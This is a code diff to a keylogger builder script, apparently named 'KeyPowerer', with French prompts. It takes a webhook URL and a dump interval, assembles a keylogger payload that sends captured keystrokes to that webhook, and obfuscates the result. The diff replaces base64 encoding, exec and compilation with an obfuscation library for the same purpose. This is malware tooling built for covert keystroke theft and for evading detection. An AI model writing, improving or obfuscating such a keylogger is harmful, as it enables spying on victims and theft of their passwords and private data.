@@ -1,6 +1,5 @@
-import py_compile
-import base64
 import os
+import hyperion_obf
 print(r"""
  ____  __.            __________                                          
 |    |/ _|____ ___.__.\______   \_______  ______  _  ________ ___________ 
@@ -11,7 +10,8 @@ print(r"""
 By LeRatGondin    
 """)
 webhook = input("Entrez le webhook : ")
-time = input("Entrez l'espacement de temps entre chaque KeyDump(en secondes) : ")
+time = input(
+    "Entrez l'espacement de temps entre chaque KeyDump(en secondes) : ")
 a = r"""
 try:
     from PyQt5.QtCore import * 
@@ -52,7 +52,7 @@ except:
     from time import sleep
 """
 a = a + f"""    lien = Webhook("{webhook}")"""
-    
+
 a = a + """
 keys = {}
 
@@ -194,14 +194,6 @@ window = MainWindow()
 app.exec()
 """
 
-a = base64.b64encode(a.encode("UTF-8"))
-finish = f"""
-import base64
-a = {a}
-exec(base64.b64decode(a.decode("UTF-8")))
-"""
-f = open("temp.pyw" ,"w")
+finish = hyperion_obf.obfuscate(script=a)
+f = open("final.py", "w")
 f.write(finish)
-f.close()
-py_compile.compile("temp.pyw","endfile.pyw")
-os.remove("temp.pyw")
